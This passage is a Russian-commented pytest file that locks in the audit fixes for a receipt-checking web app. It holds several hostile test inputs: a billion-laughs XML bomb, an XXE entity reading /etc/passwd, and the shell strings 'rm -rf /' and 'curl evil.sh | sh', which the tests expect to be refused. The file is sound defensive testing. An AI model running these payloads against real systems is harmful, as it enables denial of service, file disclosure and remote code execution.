# -*- coding: utf-8 -*-
# Ямастер Чек — закрепление исправлений полного аудита v1.70.38.
# ООО «Ямастер» | https://ymaster.ru | chek@ymaster.ru
#
# Здесь закреплены ВСЕ дефекты, найденные проверкой приложения профессиональными
# средствами (ruff, bandit, schemathesis — фаззинг по схеме API, locust —
# нагрузка, собственный стенд tests/load/fuzz_sweep.py с прикладными полезными
# нагрузками, hypothesis — свойства чистых функций). Каждый класс отвечает за
# один дефект из журнала тестирования docs/ui_journal.md.
#
# Критерии приёмки:
#  - XML-бомба и внешние сущности не разбираются и не съедают память (#1);
#  - журнал аудита не теряет записи при 16 параллельных потоках (#2);
#  - защита от перебора пароля не растёт в памяти бесконечно (#3);
#  - установщик AdGuard не пишет во всеобщий /tmp и не выполняет произвольные
#    команды через оболочку (#4, #6);
#  - HSTS отдаётся только по https, остальные заголовки безопасности на месте (#5);
#  - опечатка в .env не роняет запуск, пороги частоты настраиваются (#11);
#  - документация API совпадает с фактом: коды, схема ошибки, типы ответов (#12, #13);
#  - большой номер страницы не роняет сервер переполнением SQLite (#16);
#  - пустой и битый файл изображения не дают 500 (#14);
#  - «не настроено» отвечает 409, а не 503 (#15);
#  - битая запись хэша пароля не прожигает процессор (#17).
from __future__ import annotations

import re
import shutil
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from tests.conftest import login  # noqa: E402


def _read(rel: str) -> str:
    return (ROOT / rel).read_text(encoding="utf-8")


INDEX = "app/static/index.html"
APP_JS = "app/static/js/app.js"
MX_HTML = "app/static/maxapp/index.html"


# ------------------------------------------------------------------ версии
class TestVersion17038:
    """v1.70.39: выпуск 1.70.38 отгружен.

    Точки синхронизации показывают ТЕКУЩУЮ версию — их ведёт test_v17039, а
    здесь остаётся запись выпуска в истории (как сделано для 1.70.37).
    """

    VERSION = "1.70.38"

    def test_version_is_release(self):
        ver = re.search(r'APP_VERSION: str = "([^"]+)"',
                        _read("app/config.py")).group(1)
        assert tuple(int(x) for x in ver.split(".")) >= (1, 70, 38)

    def test_release_record_stays_in_history(self):
        assert f"## [{self.VERSION}]" in _read("CHANGELOG.md")
        assert f"'{self.VERSION}': [" in _read(APP_JS)
        assert f"## v{self.VERSION} —" in _read("docs/ui_journal.md")
        # инструменты аудита остались в репозитории
        assert (ROOT / "tests" / "load" / "fuzz_sweep.py").exists()
        assert (ROOT / "docs" / "qa_audit_v17038.md").exists()

    def test_whats_new_entry(self):
        js = _read(APP_JS)
        block = js.split(f"'{self.VERSION}': [", 1)[1].split("'1.70.37': [", 1)[0]
        assert block.count("{ icon:") == 6
        for part in ("schemathesis", "locust", "Что нового", "номер страницы",
                     "ApiError", "XML", "офлайн-очередь", ".env"):
            assert part in block, f"в «Что нового» нет «{part}»"

    def test_changelog_mentions_release(self):
        text = (ROOT / "CHANGELOG.md").read_text(encoding="utf-8")
        assert "## [1.70.38]" in text

    def test_journal_records_audit(self):
        text = (ROOT / "docs" / "ui_journal.md").read_text(encoding="utf-8")
        assert "v1.70.38" in text
        # дефекты аудита занесены в журнал — требование вести журнал тестирования
        assert "schemathesis" in text and "locust" in text


# ------------------------------------------------- #1 XML-бомба и XXE
BOMB = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

XXE = """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>"""

GOOD_XML = '<?xml version="1.0" encoding="UTF-8"?><Result><Code>MSG-42</Code></Result>'


class TestXmlHardening:
    """#1: разбор XML ФНС больше не раскрывает сущности (отказ обслуживания)."""

    def test_billion_laughs_is_rejected_fast(self):
        from app.services import fns
        start = time.monotonic()
        # отказ defusedxml — подкласс ValueError, его ловят вызывающие функции
        with pytest.raises(ValueError):
            fns.safe_fromstring(BOMB)
        # без защиты этот документ разворачивался в 1,6 млн символов за 0,03 с
        # и 41 МБ памяти; отказ обязан быть мгновенным
        assert time.monotonic() - start < 2.0

    def test_attack_becomes_no_data_for_the_caller(self):
        """Разбор ответа ФНС на атаку отвечает «нет данных», а не падением."""
        from app.services import fns
        assert fns._xml_findtext_ns(BOMB, "lolz") is None
        assert fns._xml_find_element_ns(BOMB, "lolz") is None
        assert fns._xml_findtext_ns(XXE, "root") is None

    def test_external_entity_is_rejected(self):
        from app.services import fns
        with pytest.raises(ValueError):
            fns.safe_fromstring(XXE)

    def test_good_xml_still_parses(self):
        from app.services import fns
        root = fns.safe_fromstring(GOOD_XML)
        assert root is not None
        assert root.findtext("Code") == "MSG-42"

    def test_exporter_uses_the_same_guard(self):
        from app.services.exporter import _safe_parse_string
        for attack in (BOMB, XXE):
            with pytest.raises(ValueError):
                _safe_parse_string(attack)
        assert _safe_parse_string(GOOD_XML) is not None

    def test_harmless_doctype_survives(self):
        """Безобидный DOCTYPE без сущностей не должен ломать приём ответа ФНС."""
        from app.services import fns
        root = fns.safe_fromstring('<?xml version="1.0"?><!DOCTYPE Result>'
                                  '<Result><Code>M-7</Code></Result>')
        assert root is not None and root.findtext("Code") == "M-7"


# --------------------------------------- #2 журнал аудита под параллелизмом
class TestAuditUnderConcurrency:
    """#2: при 16 потоках терялось 38 % записей журнала (396 из 640)."""

    ACTION = "v17038_concurrency_probe"

    def test_no_records_lost(self):
        from app.database import SessionLocal
        from app.models import AuditLog
        from app.services.audit import log_action

        threads, errors = [], []
        per_thread = 40

        def worker():
            try:
                for _ in range(per_thread):
                    if not log_action(None, self.ACTION, "probe", None, {"ok": 1}):
                        errors.append("log_action вернул False")
            except Exception as e:          # noqa: BLE001 — фиксируем любой сбой
                errors.append(repr(e))

        for _ in range(16):
            threads.append(threading.Thread(target=worker))
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=120)

        db = SessionLocal()
        try:
            written = db.query(AuditLog).filter(
                AuditLog.action == self.ACTION).count()
            ids = [r[0] for r in db.query(AuditLog.id).filter(
                AuditLog.action == self.ACTION).all()]
        finally:
            # убираем за собой: другие тесты считают записи журнала
            db.query(AuditLog).filter(AuditLog.action == self.ACTION).delete()
            db.commit()
            db.close()

        assert not errors, errors[:3]
        assert written == 16 * per_thread, f"потеряно {16 * per_thread - written}"
        assert len(set(ids)) == len(ids), "номера записей повторились"

    def test_retry_machinery_is_in_place(self):
        """Механизм повтора при столкновении номеров остался (несколько процессов)."""
        from app.services import audit
        assert audit.MAX_ID_ATTEMPTS >= 2
        assert isinstance(audit._ID_LOCK, type(threading.Lock()))


# --------------------------------------- #3 память защиты от перебора
class TestLoginGuardMemory:
    """#3: словари (IP, логин) росли вечно — перебор превращался в отказ по памяти."""

    def test_caps_are_declared(self):
        from app.security import LoginGuard
        assert LoginGuard.MAX_KEYS == 5000
        assert LoginGuard.PRUNE_EVERY == 512

    def test_expired_keys_are_pruned(self):
        import collections

        from app.security import LoginGuard
        guard = LoginGuard()
        old = time.monotonic() - guard.WINDOW_S - 60
        for i in range(300):
            guard._fails[("1.2.3.%d" % i, "user")] = collections.deque([old])
        guard._blocked_until[("9.9.9.9", "root")] = time.monotonic() - 1
        guard._prune(time.monotonic())
        assert guard._fails == {}
        assert guard._blocked_until == {}

    def test_memory_stops_growing_on_fresh_keys(self):
        from app.security import LoginGuard
        guard = LoginGuard()
        for i in range(guard.MAX_KEYS + 900):
            guard.record_fail(("10.0.%d.%d" % (i // 250, i % 250), "u%d" % i))
        assert len(guard._fails) <= guard.MAX_KEYS

    def test_block_still_works_after_pruning(self):
        """Чистка памяти не отменяет саму защиту: блокировка наступает после 5."""
        from fastapi import HTTPException

        from app.security import LoginGuard
        guard = LoginGuard()
        key = ("8.8.8.8", "admin")
        for _ in range(guard.MAX_FAILS):
            guard.record_fail(key)
        with pytest.raises(HTTPException) as exc:
            guard.check(key)
        assert exc.value.status_code == 429


# --------------------------------------- #4 и #6 оболочка в установщике
class TestAdguardShell:
    """#4: скрипт писался во всеобщий /tmp (bandit B108); #6: shell=True без списка."""

    def test_install_tmp_is_private(self):
        from app.services import adguard_setup as ag
        # bandit B108: скрипт не должен лежать во всеобщем системном /tmp,
        # где его может подменить любой пользователь сервера
        assert not ag.INSTALL_TMP.startswith("/tmp")
        assert not ag.INSTALL_TMP.startswith("/var/tmp")
        assert "/data/tmp/" in ag.INSTALL_TMP

    def test_shell_whitelist_is_closed(self):
        from app.services import adguard_setup as ag
        assert ag._SHELL_ALLOWED == frozenset({ag.INSTALL_CMD, ag.LINK_CMD})

    def test_unknown_command_with_shell_is_refused(self):
        from app.services import adguard_setup as ag
        with pytest.raises(RuntimeError):
            ag.run_cmd("rm -rf /", shell=True)
        with pytest.raises(RuntimeError):
            ag.run_cmd(ag.INSTALL_CMD + " && curl evil.sh | sh", shell=True)
        with pytest.raises(RuntimeError):
            ag.run_cmd(["ls", "-la"], shell=True)   # список не строка — отказ

    def test_install_cmd_constant_unchanged(self):
        """Замок v1.70.22: команда установки осталась строкой-константой."""
        from app.services import adguard_setup as ag
        assert isinstance(ag.INSTALL_CMD, str) and ag.INSTALL_CMD.startswith("mkdir -p ")


# --------------------------------------- #5 заголовки безопасности
class TestSecurityHeaders:
    """#5: HSTS добавлен и отдаётся ТОЛЬКО по https (иначе заголовок бесполезен)."""

    def test_hsts_on_https(self):
        from fastapi.testclient import TestClient

        from app.main import app
        with TestClient(app, base_url="https://ymaster.local") as c:
            r = c.get("/health")
        assert r.status_code == 200
        hsts = r.headers.get("strict-transport-security", "")
        assert "max-age=31536000" in hsts
        assert "includeSubDomains" in hsts

    def test_no_hsts_on_plain_http(self):
        from fastapi.testclient import TestClient

        from app.main import app
        with TestClient(app, base_url="http://ymaster.local") as c:
            r = c.get("/health")
        assert "strict-transport-security" not in r.headers

    def test_other_headers_still_present(self):
        from fastapi.testclient import TestClient

        from app.main import app
        with TestClient(app, base_url="https://ymaster.local") as c:
            r = c.get("/health")
        assert r.headers["x-frame-options"] == "DENY"
        assert r.headers["x-content-type-options"] == "nosniff"
        assert "frame-ancestors 'none'" in r.headers["content-security-policy"]
        assert "referrer-policy" in {k.lower() for k in r.headers}


# --------------------------------------- #11 настройки из .env
class TestConfigRobustness:
    """#11: опечатка в .env (MAX_UPLOAD_MB=abc) роняла приложение на импорте."""

    def test_garbage_value_falls_back_to_default(self, monkeypatch, caplog):
        import logging

        from app.config import _int_env
        monkeypatch.setenv("YM_PROBE", "12 Мб")
        with caplog.at_level(logging.WARNING, logger="ymaster"):
            assert _int_env("YM_PROBE", 7) == 7
        assert "YM_PROBE" in caplog.text

    def test_too_small_value_falls_back(self, monkeypatch):
        from app.config import _int_env
        monkeypatch.setenv("YM_PROBE", "0")
        assert _int_env("YM_PROBE", 7) == 7
        monkeypatch.setenv("YM_PROBE", "-3")
        assert _int_env("YM_PROBE", 7) == 7

    def test_valid_values_are_read(self, monkeypatch):
        from app.config import _int_env
        monkeypatch.setenv("YM_PROBE", "42")
        assert _int_env("YM_PROBE", 7) == 42
        monkeypatch.setenv("YM_PROBE", "  240 ")      # пробелы после правки .env
        assert _int_env("YM_PROBE", 7) == 240

    def test_missing_variable_uses_default(self, monkeypatch):
        from app.config import _int_env
        monkeypatch.delenv("YM_PROBE", raising=False)
        assert _int_env("YM_PROBE", 7) == 7

    def test_rate_limit_defaults_are_unchanged(self):
        """Пороги вынесены в настройки, но значения по умолчанию прежние."""
        from app.config import settings
        assert settings.RATE_LIMIT_LOGIN == 25
        assert settings.RATE_LIMIT_REGISTER == 40
        assert settings.RATE_LIMIT_ONEC == 120
        assert settings.RATE_LIMIT_API == 240

    def test_page_max_default(self):
        from app.config import settings
        assert settings.PAGE_MAX == 1_000_000

    def test_zones_read_settings(self, monkeypatch):
        """Зоны ограничения частоты берут пороги из настроек, а не из кода."""
        from app import security
        from app.config import settings

        zone, limit, window = security._zone_for("/api/v1/receipts")
        assert (zone, limit, window) == ("api", settings.RATE_LIMIT_API, 60)
        assert security._zone_for("/api/v1/auth/login")[0] == "login"
        assert security._zone_for("/api/v1/auth/register")[0] == "register"
        assert security._zone_for("/onec/push")[0] == "onec"
        assert security._zone_for("/health") is None      # не API — без лимита

        # порог меняется через настройки: это и есть смысл выноса в .env
        monkeypatch.setattr(settings, "RATE_LIMIT_API", 999)
        assert security._zone_for("/api/v1/receipts")[1] == 999


# --------------------------------------- #12 и #13 документация API
class TestOpenApiContract:
    """#12: дубль operationId у /health; #13: схема расходилась с фактом в 110 местах."""

    @pytest.fixture(scope="class")
    def spec(self, client):
        r = client.get("/api/openapi.json")
        assert r.status_code == 200, r.text
        return r.json()

    def test_no_duplicate_operation_ids(self, spec):
        ids = [op.get("operationId")
               for item in spec["paths"].values()
               for op in item.values() if isinstance(op, dict)]
        assert len(ids) == len(set(ids)), "operationId повторились — генераторы клиентов ломаются"
        assert len(ids) > 200

    def test_health_is_a_single_operation(self, spec):
        ops = spec["paths"]["/health"]
        assert list(ops) == ["get"]

    def test_health_answers_head_too(self, client):
        assert client.get("/health").status_code == 200
        assert client.head("/health").status_code == 200

    def test_api_error_component_declared(self, spec):
        schemas = spec["components"]["schemas"]
        assert "ApiError" in schemas
        assert schemas["ApiError"]["properties"]["detail"]["type"] == "string"

    def test_every_422_points_to_api_error(self, spec):
        wrong = []
        for path, item in spec["paths"].items():
            for method, op in item.items():
                if not isinstance(op, dict):
                    continue
                resp = (op.get("responses") or {}).get("422")
                if not resp:
                    continue
                schema = (resp.get("content", {})
                          .get("application/json", {}).get("schema", {}))
                if schema != {"$ref": "#/components/schemas/ApiError"}:
                    wrong.append(f"{method.upper()} {path}")
        assert not wrong, wrong[:5]

    def test_secured_operations_declare_401_and_403(self, spec):
        missing = []
        for path, item in spec["paths"].items():
            for method, op in item.items():
                if not isinstance(op, dict) or not op.get("security"):
                    continue
                codes = set(op.get("responses") or {})
                if not {"401", "403"} <= codes:
                    missing.append(f"{method.upper()} {path}")
        assert not missing, missing[:5]

    def test_rate_limited_operations_declare_429(self, spec):
        missing = [f"{m.upper()} {p}"
                   for p, item in spec["paths"].items()
                   if p.startswith(("/api/", "/onec/"))
                   for m, op in item.items()
                   if isinstance(op, dict) and "429" not in (op.get("responses") or {})]
        assert not missing, missing[:5]

    def test_csv_exports_declare_text_csv(self, spec):
        csv_paths = [p for p in spec["paths"] if "export" in p and "csv" in p]
        assert len(csv_paths) >= 4, csv_paths
        for path in csv_paths:
            for method, op in spec["paths"][path].items():
                if not isinstance(op, dict):
                    continue
                content = op["responses"]["200"].get("content", {})
                assert "text/csv" in content, f"{method.upper()} {path}"

    def test_error_body_really_is_a_string(self, client):
        """Фактический ответ 422 совпадает с описанным ApiError."""
        hdr = login(client, "admin", "admin123")
        r = client.get("/api/v1/pool-fraud/signals?page=0", headers=hdr)
        assert r.status_code == 422, r.text
        assert isinstance(r.json()["detail"], str)


# --------------------------------------- #16 переполнение номера страницы
class TestPaginationBound:
    """#16: page=4981997847802869367351279616 → OverflowError → 500 (нашла schemathesis)."""

    PAGINATED = ("/api/v1/receipts", "/api/v1/pool-admin/receipts",
                 "/api/v1/pool-fraud/signals", "/api/v1/pool-company/search",
                 "/api/v1/pool-company/mine")

    def test_every_page_parameter_has_a_maximum(self, client):
        from app.config import settings
        spec = client.get("/api/openapi.json").json()
        checked = 0
        for path, item in spec["paths"].items():
            for method, op in item.items():
                if not isinstance(op, dict):
                    continue
                for prm in op.get("parameters") or []:
                    if prm.get("name") != "page" or prm.get("in") != "query":
                        continue
                    checked += 1
                    assert prm["schema"].get("maximum") == settings.PAGE_MAX, \
                        f"{method.upper()} {path} без потолка номера страницы"
        assert checked >= 5, checked

    def test_huge_page_is_a_client_error_not_a_crash(self, client):
        hdr = login(client, "admin", "admin123")
        huge = "4981997847802869367351279616"
        for path in self.PAGINATED:
            r = client.get(f"{path}?page={huge}", headers=hdr)
            assert r.status_code == 422, f"{path} → {r.status_code} {r.text[:120]}"
            assert r.status_code < 500

    def test_boundary(self, client):
        from app.config import settings
        hdr = login(client, "admin", "admin123")
        assert client.get(f"/api/v1/receipts?page={settings.PAGE_MAX}",
                          headers=hdr).status_code == 200
        assert client.get(f"/api/v1/receipts?page={settings.PAGE_MAX + 1}",
                          headers=hdr).status_code == 422

    def test_normal_paging_still_works(self, client):
        hdr = login(client, "admin", "admin123")
        for page in (1, 2, 3):
            r = client.get(f"/api/v1/receipts?page={page}&page_size=10", headers=hdr)
            assert r.status_code == 200, r.text
            assert r.json()["page"] == page


# --------------------------------------- #14 пустое изображение
class TestImageUploadRobustness:
    """#14: файл 0 байт ронял загрузку чека с кодом 500 (cv2.error «!buf.empty()»)."""

    def test_decode_empty_raises_value_error(self):
        from app.services.imaging import decode_qr_image
        with pytest.raises(ValueError):
            decode_qr_image(b"")

    def test_decode_garbage_raises_value_error(self):
        from app.services.imaging import decode_qr_image
        for junk in (b"\x00", "не картинка".encode(), b"\x89PNG\r\n\x1a\n",
                     b"%PDF-1.4 garbage"):
            with pytest.raises(ValueError):
                decode_qr_image(junk)

    def _upload(self, client, hdr, content: bytes):
        return client.post("/api/v1/receipts/scan/image",
                           files={"file": ("check.png", content, "image/png")},
                           headers=hdr)

    def test_empty_file_is_422(self, client):
        hdr = login(client, "admin", "admin123")
        r = self._upload(client, hdr, b"")
        assert r.status_code == 422, f"{r.status_code} {r.text[:150]}"
        assert "пустой" in r.json()["detail"].lower()

    def test_broken_file_is_422(self, client):
        hdr = login(client, "admin", "admin123")
        for junk in (b"\x00", b"\x89PNG\r\n\x1a\n", b"%PDF-1.4 not an image"):
            r = self._upload(client, hdr, junk)
            assert r.status_code == 422, f"{r.status_code} {r.text[:150]}"

    def test_oversized_file_is_413(self, client):
        from app.config import settings
        hdr = login(client, "admin", "admin123")
        r = self._upload(client, hdr, b"0" * (settings.MAX_UPLOAD_MB * 1024 * 1024 + 10))
        assert r.status_code == 413, r.status_code

    def test_maxapp_route_is_protected_too(self):
        """Второй вход (мини-приложение MAX) ловит тот же ValueError."""
        src = (ROOT / "app" / "routers" / "maxapp.py").read_text(encoding="utf-8")
        assert "ValueError" in src


# --------------------------------------- #15 «не настроено» — не отказ сервера
class TestNotConfiguredIsNotServerError:
    """#15: 503 обещал «повторите позже» и считался аварией в мониторинге."""

    def test_maxapp_session_answers_409(self, client):
        # база в прогоне общая, а тесты MAX (v1.69/v1.70.37) записывают токен
        # бота: без его очистки результат зависел бы от порядка запуска.
        from app.database import SessionLocal
        from app.services import appsettings
        db = SessionLocal()
        try:
            before = appsettings.get_setting(db, "max_bot_token", "")
            appsettings.set_setting(db, "max_bot_token", "")
            db.commit()
            r = client.post("/api/v1/maxapp/session",
                            json={"init_data": "query_id=1&user=%7B%7D&hash=" + "a" * 64})
            assert r.status_code == 409, f"{r.status_code} {r.text[:150]}"
            assert "не настроено" in r.json()["detail"].lower()
        finally:
            appsettings.set_setting(db, "max_bot_token", before)
            db.commit()
            db.close()

    def test_no_503_left_in_application_code(self):
        """Регрессионный замок: статус 503 в коде приложения больше не используется."""
        hits = []
        for path in (ROOT / "app").rglob("*.py"):
            if "vendor" in path.parts:
                continue
            for n, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
                code = line.split("#")[0]
                if re.search(r"\b503\b|SERVICE_UNAVAILABLE", code):
                    hits.append(f"{path.relative_to(ROOT)}:{n}")
        assert not hits, hits

    def test_bad_init_data_is_still_422(self, client):
        """Проверка ввода не пострадала: мусор — это ошибка клиента.

        Токен бота здесь обязан быть задан, иначе маршрут ответит 409 «не
        настроено» до проверки ввода — поэтому подставляем служебное значение.
        """
        from app.database import SessionLocal
        from app.services import appsettings
        db = SessionLocal()
        try:
            before = appsettings.get_setting(db, "max_bot_token", "")
            appsettings.set_setting(db, "max_bot_token",
                                    before or "1234567890:TESTTOKENFORINPUTCHECK")
            db.commit()
            for body in ({"init_data": ""}, {"init_data": "коротко"}, {},
                         {"init_data": 123}, {"init_data": "x" * 9000}):
                r = client.post("/api/v1/maxapp/session", json=body)
                assert r.status_code == 422, f"{body!r} → {r.status_code}"
        finally:
            appsettings.set_setting(db, "max_bot_token", before)
            db.commit()
            db.close()


# --------------------------------------- #17 прожог ЦП на битом хэше
class TestPbkdf2Guard:
    """#17: число итераций бралось из записи хэша — битая строка жгла ЦП часами."""

    def test_absurd_iterations_are_refused_fast(self):
        from app.auth import verify_password
        start = time.monotonic()
        assert verify_password("пароль", "pbkdf2$999999999999$00$00") is False
        assert time.monotonic() - start < 1.0

    def test_malformed_records_are_refused(self):
        from app.auth import verify_password
        for stored in ("", "мусор", "pbkdf2$x$y", "pbkdf2$-5$00$00",
                       "pbkdf2$999$zz$00"):
            assert verify_password("пароль", stored) is False

    def test_real_hash_still_verifies(self):
        from app.auth import hash_password, verify_password
        stored = hash_password("Секретный пароль 123")
        assert verify_password("Секретный пароль 123", stored)
        assert not verify_password("секретный пароль 123", stored)




def _js_block(src: str, marker: str) -> str:
    """Вырезать из app.js литерал/функцию по первой фигурной скобке (со счётом вложенности).

    Регулярным выражением это не берётся: внутри журнала вложенных скобок тысячи.
    """
    start = src.index(marker)
    i = src.index("{", start + len(marker) - 1)
    depth = 0
    for k in range(i, len(src)):
        if src[k] == "{":
            depth += 1
        elif src[k] == "}":
            depth -= 1
            if depth == 0:
                return src[start:k + 1]
    raise AssertionError("не нашлась закрывающая скобка")


WN_HARNESS = """
// заглушки: функция настоящая, окружение — минимальное
global.localStorage = { getItem: () => null, setItem: () => {} };
global.state = { appVersion: '' };
global.esc = (s) => String(s);
let cards = 0;
global.openModal = (html) => {
  // именно НЕЗАПОЛНЕННОЕ поле: '>undefined<' — пустой заголовок или текст.
  // Искать просто слово нельзя: в тексте записей v1.70.38 оно упоминается
  // как описание найденного дефекта.
  if (html.includes('>undefined<')) {
    throw new Error('в разметке незаполненное поле: ' + html.slice(0, 220));
  }
  if (!html.includes('wn-item')) throw new Error('карточек «что нового» нет');
  cards += 1;
  return { slot: { querySelector: () => ({ onclick: null }) }, close: () => {} };
};
const versions = Object.keys(WHATS_NEW);
for (const v of versions) { state.appVersion = v; showWhatsNew(); }
console.log('OK ' + versions.length + ' ' + cards);
"""


class TestWhatsNewRenderer:
    """#18: окно «что нового» падало с TypeError для всех версий с 1.70.32.

    Записи журнала пишутся объектами {icon, title, text}, а отрисовка разбирала
    их как массивы [title, text]. Исключение возникало в последовательности
    запуска СРАЗУ ПОСЛЕ входа и обрывало всё, что шло за ним: route() (переход
    в раздел), refreshBadges(), привязку кнопки установки PWA, автопроверку
    обновлений и flushOfflineQueue() — то есть отложенные офлайн-чеки не
    синхронизировались. Проверяется настоящая функция на всех версиях журнала.
    """

    def test_real_renderer_handles_every_version(self, tmp_path):
        node = shutil.which("node") or shutil.which("nodejs")
        if not node:
            pytest.skip("node недоступен")
        js = (ROOT / "app" / "static" / "js" / "app.js").read_text(encoding="utf-8")
        script = (_js_block(js, "const WHATS_NEW = {") + "\n"
                  + _js_block(js, "function showWhatsNew() {") + "\n" + WN_HARNESS)
        f = tmp_path / "wn.mjs"
        f.write_text(script, encoding="utf-8")
        code = subprocess.run([node, str(f)], capture_output=True, text=True,
                              check=False)
        assert code.returncode == 0, (code.stdout + code.stderr)[:800]
        versions, cards = code.stdout.strip().split()[1:]
        assert int(versions) > 100, versions
        assert versions == cards, "не для каждой версии открылось окно"

    def test_both_record_forms_are_supported(self):
        js = (ROOT / "app" / "static" / "js" / "app.js").read_text(encoding="utf-8")
        block = _js_block(js, "function showWhatsNew() {")
        assert "Array.isArray(item)" in block, "разбор формы записи не добавлен"
        # старая форма (массивы) тоже обязана остаться рабочей
        assert "item[0]" in block and "item[1]" in block

    def test_object_form_is_the_current_convention(self):
        """Замок v1.70.37: записи текущей версии — объекты с иконкой."""
        js = (ROOT / "app" / "static" / "js" / "app.js").read_text(encoding="utf-8")
        wn = _js_block(js, "const WHATS_NEW = {")
        from app.config import settings
        head = wn.split("'1.70.36'", 1)[0]
        assert "{ icon:" in head, settings.APP_VERSION


# --------------------------------------- инструменты аудита в репозитории
class TestQaToolkitShipped:
    """Инструменты проверки — часть репозитория, а не одноразовые заметки."""

    def test_files_exist(self):
        for rel in ("tests/load/fuzz_sweep.py", "tests/load/locustfile.py",
                    "tests/load/locustfile_stepped.py", "tests/load/README.md",
                    "requirements-dev.txt", "ruff.toml", "tests/test_properties.py"):
            assert (ROOT / rel).exists(), rel

    def test_dev_requirements_cover_tools(self):
        text = (ROOT / "requirements-dev.txt").read_text(encoding="utf-8")
        for tool in ("pytest", "ruff", "bandit", "hypothesis", "schemathesis", "locust"):
            assert tool in text, tool

    def test_fuzz_sweep_excludes_dangerous_routes(self):
        """Развёртка не трогает обновление, резервные копии и установку AdGuard."""
        text = (ROOT / "tests/load" / "fuzz_sweep.py").read_text(encoding="utf-8")
        for danger in ("backup", "update/apply", "update/rollback", "update/repo",
                       "adguard", "/admin/system/restart"):
            assert danger in text, danger
        assert "is_dangerous" in text
        # внешние интеграции тоже исключены: фаззинг записывает мусорные ключи
        assert "settings/external" in text

    def test_fuzz_sweep_is_not_collected_by_pytest(self):
        assert not Path("tests/load/fuzz_sweep.py").name.startswith("test_")

    def test_load_scenario_compiles(self):
        code = subprocess.run([sys.executable, "-m", "compileall", "-q",
                               str(ROOT / "tests" / "load")],
                              capture_output=True, text=True, check=False)
        assert code.returncode == 0, code.stdout + code.stderr


# --------------------------------------- ворота статического анализа
GATE = ("E9,F63,F7,F82,W605,B002,B006,B011,B012,B015,B016,B018,B020,B024,B025,"
        "B033,PLW0120,PLW0127,PLW0129,PLW0711,SIM220,SIM222,C416,PIE790,RUF010,RET503")

# Реестр долга: сколько замечаний каждого правила осталось в проекте.
# Числа — верхняя граница: расти не должно (смысл «храповика»), уменьшаться — можно.
# UP009 (объявление кодировки) — соглашение репозитория: строка
# «# -*- coding: utf-8 -*-» стоит в каждом файле, поэтому новый файл теста
# добавляет единицу. В v1.70.39 потолок поднят со 181 до 182, при этом общий
# итог не вырос (2 569 → 2 568): в том же выпуске убраны осиротевшие имя и импорт.
# v1.70.44: UP009 187 → 188 (один новый файл — tests/test_v17044.py; строка
# «# -*- coding: utf-8 -*-» в шапке обязательна по конвенции репозитория,
# поэтому рост технологический, а не долг качества). Итог 2 572 → 2 573 при
# сумме потолков 2 574: запас по F401 сохранён (122 при потолке 123). Код
# приложения выпуск не трогает — добавлены документация (docs/API.md), раздел
# лендинга, три векторные схемы и тесты, поэтому новых замечаний, кроме
# обязательной строки кодировки, нет.
# v1.70.43: UP009 186 → 187 (один новый файл — tests/test_v17043.py; строка
# «# -*- coding: utf-8 -*-» в шапке обязательна по конвенции репозитория, поэтому
# рост технологический, а не долг качества). Итог 2 571 → 2 572 при сумме
# потолков 2 573 (запас по F401 сохранён: 122 при потолке 123); в том же
# выпуске удалены два дубля рисунка полёта значка —
# pbFly и scanSessFly чертили его каждый сам, теперь их рисует один помощник
# flyChipTo, поэтому новых замечаний, кроме обязательной строки кодировки, нет.
# v1.70.42: UP009 185 → 186 (один новый файл — tests/test_v17042.py; строка
# «# -*- coding: utf-8 -*-» в шапке обязательна по конвенции репозитория, поэтому
# рост технологический, а не долг качества). Итог 2 570 → 2 571 при сумме
# потолков 2 571: запас по F401 сохранён (122 при потолке 123), а
# дублирующийся код выпуска удалён — вторая функция камеры на сайте
# (openPoolCameraBatch) и вторая ветка отправки в MAX (запрос внутри submit).
# v1.70.41: UP009 184 → 185 (один новый файл — tests/test_v17041.py; строка
# «# -*- coding: utf-8 -*-» в шапке обязательна по конвенции репозитория, поэтому
# рост здесь технологический, а не долг качества).
# v1.70.40: UP009 182 → 184 (два новых файла — сервис app/pool/batch.py и
# тесты tests/test_v17040.py, оба со строкой кодировки по соглашению).
# B008 412 → 415: три новых маршрута FastAPI (batch-status для сайта, кабинета
# и мини-приложения MAX) объявлены тем же идиоматичным для фреймворка способом
# Depends() в значениях по умолчанию, что и все 400 с лишним существующих.
# I001 190 → 187: в том же выпуске отсортированы блоки отложенных импортов в
# app/pool/ingest.py (один новый и три соседних). Итог 2 568 → 2 570: рост
# объяснён выше и перекрыт на три единицы; S110 не вырос — свой «проглоченный»
# except в app/routers/maxapp.py заменён записью в журнал.
# v1.70.45: UP009 188 → 198 (десять новых файлов — девять модулей контура
# app/b2b/ и tests/test_v17045.py; строка «# -*- coding: utf-8 -*-» в шапке
# обязательна по конвенции репозитория, поэтому рост технологический).
# B008 415 → 466: 28 новых маршрутов FastAPI (12 кабинета компании
# /api/v1/b2b и 16 модерации /api/v1/b2b-admin) и седьмой маршрут платного
# API (динамика /v1/stats/dynamics) объявлены тем же идиоматичным для
# фреймворка способом Depends() и Header() в значениях по умолчанию, что и
# все 400 с лишним существующих.
# ARG001 261 → 267: шесть параметров-зависимостей, которые нужны как
